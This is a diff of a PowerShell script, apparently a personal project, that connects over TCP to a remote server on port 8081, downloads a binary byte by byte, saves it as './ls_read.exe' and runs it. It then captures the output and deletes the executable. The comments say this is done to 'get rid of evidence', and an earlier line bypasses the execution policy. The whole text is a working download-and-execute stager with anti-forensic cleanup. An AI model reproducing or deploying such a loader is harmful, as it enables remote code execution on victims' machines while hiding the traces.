@@ -14,15 +14,29 @@ $PORT = "8081";
 $TCP_CLIENT = New-Object System.Net.Sockets.TcpClient;
 $TCP_CLIENT.Connect($IP_ADDR, $PORT);
 
-# Grab stream and turn it into a readStream (in both ways)
+# Grab the stream and attach a Binary Reader to it since StreamReaders are designed for ASCII text
 $STREAM = $TCP_CLIENT.GetStream();
-$READ_STREAM = New-Object System.IO.StreamReader($STREAM);
+$READ_STREAM = New-Object System.IO.BinaryReader($STREAM)
+
+# Create a list to store the bytes
+$BYTES = New-Object 'System.Collections.Generic.List[System.Byte]'
 
 # Chuck all the read data into a PS1 file.
-$READ_STREAM.ReadToEnd() >> "./ls_read.exe";
+while ($STREAM.DataAvailable) 
+{
+    $byte = $READ_STREAM.ReadByte()
+    $BYTES.Add($byte)
+}
+[System.IO.File]::WriteAllBytes('./ls_read.exe', $BYTES.ToArray());
+
+# Formally closes the TCP Connection - At this point, FIN from Node server should have been sent, so this just sends FIN ACK.
+# ⭐ Side Note: After this runs, Node.js server should report "Session Terminated."
+$TCP_CLIENT.Close();
 
 # Execution Policy isn't a security feature - so we can just bypass that
-powershell.exe -ExecutionPolicy Bypass -File "./ls_read.exe";
+# $OUTPUT = powershell.exe -ExecutionPolicy Bypass -File "./ls_read.exe";
+$OUTPUT = ./ls_read.exe;
+$OUTPUT > "./output.txt";
 
 # Get rid of evidence
-rm "./ls_read.exe";
+Remove-Item "./ls_read.exe";
